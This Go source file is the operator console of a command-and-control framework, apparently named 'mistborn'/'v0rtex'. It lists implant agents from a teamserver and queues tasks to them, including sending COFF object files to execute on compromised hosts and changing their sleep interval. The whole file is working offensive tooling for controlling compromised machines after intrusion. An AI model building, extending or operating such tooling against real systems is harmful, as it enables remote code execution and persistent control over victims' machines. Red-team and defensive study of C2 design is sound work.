package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"

	pkg "mistborn.c2/m/v2/internal"

	"github.com/chzyer/readline"
	"github.com/olekukonko/tablewriter"
)

func sendTaskToServer(task *pkg.Task) error {
	data, err := json.Marshal(task)
	if err != nil {
		return fmt.Errorf("error marshalling task: %v", err)
	}

	req, err := http.NewRequest("POST", "http://localhost:8000/queue", bytes.NewBuffer(data))
	if err != nil {
		return fmt.Errorf("error creating request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error sending request to server: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server error: %s", resp.Status)
	}
	return nil
}

func fetchTaskStatusFromServer(taskID string) (bool, string, error) {
	resp, err := http.Get("http://localhost:8000/client/status/" + taskID)
	if err != nil {
		return false, "", fmt.Errorf("error fetching task status: %v", err)
	}
	defer resp.Body.Close()

	var result struct {
		Finished bool   `json:"finished"`
		Result   string `json:"result"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return false, "", fmt.Errorf("error decoding response: %v", err)
	}
	return result.Finished, result.Result, nil
}

func fetchAgentsFromServer() ([]pkg.Agent, error) {
	resp, err := http.Get("http://localhost:8000/client/all-agents")
	if err != nil {
		return nil, fmt.Errorf("error fetching agents: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned: %s", resp.Status)
	}

	var agents []pkg.Agent
	if err := json.NewDecoder(resp.Body).Decode(&agents); err != nil {
		return nil, fmt.Errorf("error decoding response: %v", err)
	}

	return agents, nil
}

func handleSleepTask(agentID, sleepArg string) {
	taskID, _ := pkg.GenerateRandomID(3)
	task := pkg.Task{TaskType: "sleep", AgentID: agentID, ID: taskID, Args: sleepArg}

	if err := sendTaskToServer(&task); err != nil {
		fmt.Println("Failed to sync task with server:", err)
		return
	}

	for {
		time.Sleep(1 * time.Second)
		finished, result, err := fetchTaskStatusFromServer(taskID)
		if err != nil {
			fmt.Println("Error checking task status:", err)
			return
		}
		if finished {
			fmt.Println("Task completed with result:", result)
			return
		}
	}
}

func handleCoffTask(agentID, coffPath, coffArg string) {
	taskID, _ := pkg.GenerateRandomID(3)
	task := pkg.Task{TaskType: "coff", AgentID: agentID, ID: taskID, FilePath: coffPath, Args: coffArg}

	if err := sendTaskToServer(&task); err != nil {
		fmt.Println("Failed to sync task with server:", err)
		return
	}

	for {
		time.Sleep(1 * time.Second)
		finished, result, err := fetchTaskStatusFromServer(taskID)
		if err != nil {
			fmt.Println("Error checking task status:", err)
			return
		}
		if finished {
			fmt.Println("Task completed with result:", result)
			return
		}
	}
}

var mainCompleter *readline.PrefixCompleter

func main() {
	mainCompleter = readline.NewPrefixCompleter(
		readline.PcItem("list"),
		readline.PcItem("interact", readline.PcItemDynamic(func(line string) []string {
			agents, _ := fetchAgentsFromServer()
			ids := make([]string, len(agents))
			for i, agent := range agents {
				ids[i] = agent.ID
			}
			return ids
		})),
		readline.PcItem("exit"),
	)

	rl, err := readline.NewEx(&readline.Config{
		Prompt:       "v0rtex> ",
		AutoComplete: mainCompleter,
		HistoryFile:  "/tmp/readline.tmp",
	})
	if err != nil {
		fmt.Println("Error setting up readline:", err)
		return
	}
	defer rl.Close()

	for {
		line, err := rl.Readline()
		if err != nil {
			break
		}
		args := strings.Fields(line)
		if len(args) == 0 {
			continue
		}

		switch args[0] {
		case "list":
			agents, err := fetchAgentsFromServer()
			if err != nil {
				fmt.Println("Error fetching agents:", err)
				continue
			}
			table := tablewriter.NewWriter(os.Stdout)
			table.SetHeader([]string{"ID", "Name", "Host", "Alive"})
			for _, agent := range agents {
				isActive := pkg.Ternary(agent.IsActive, "True", "False")
				table.Append([]string{agent.ID, agent.Name, agent.Host, pkg.AnyToString(isActive)})
			}
			table.Render()
		case "interact":
			if len(args) < 2 {
				fmt.Println("Please specify an agent ID to interact with.")
				continue
			}
			agentID := args[1]
			interactWithAgent(rl, agentID)
		case "exit":
			os.Exit(0)
		default:
			fmt.Println("Unknown command:", args[0])
		}
	}
}

func interactWithAgent(rl *readline.Instance, agentID string) {
	interactCompleter := readline.NewPrefixCompleter(
		readline.PcItem("sleep"),
		readline.PcItem("coff"),
		readline.PcItem("back"),
		readline.PcItem("exit"),
	)

	rl.Config.AutoComplete = interactCompleter
	rl.SetPrompt("v0rtex " + agentID + "> ")

	for {
		agentCommand, err := rl.Readline()
		if err != nil {
			break
		}
		agentArgs := strings.Fields(agentCommand)
		if len(agentArgs) == 0 {
			continue
		}

		switch agentArgs[0] {
		case "sleep":
			if len(agentArgs) > 1 {
				handleSleepTask(agentID, agentArgs[1])
			} else {
				fmt.Println("Usage: sleep <milliseconds>")
			}
		case "coff":
			if len(agentArgs) > 1 {
				if _, err := os.Stat(agentArgs[1]); os.IsNotExist(err) {
					fmt.Println("File not found")
				} else {
					coffArgs := ""
					if len(agentArgs) > 2 {
						coffArgs = agentArgs[2]
					}
					handleCoffTask(agentID, agentArgs[1], coffArgs)
				}
			} else {
				fmt.Println("Usage: coff <path>")
			}
		case "back":
			rl.SetPrompt("v0rtex> ")
			rl.Config.AutoComplete = mainCompleter
			return
		case "exit":
			os.Exit(0)
		default:
			fmt.Println("Unknown command in interact mode:", agentArgs[0])
		}
	}
}
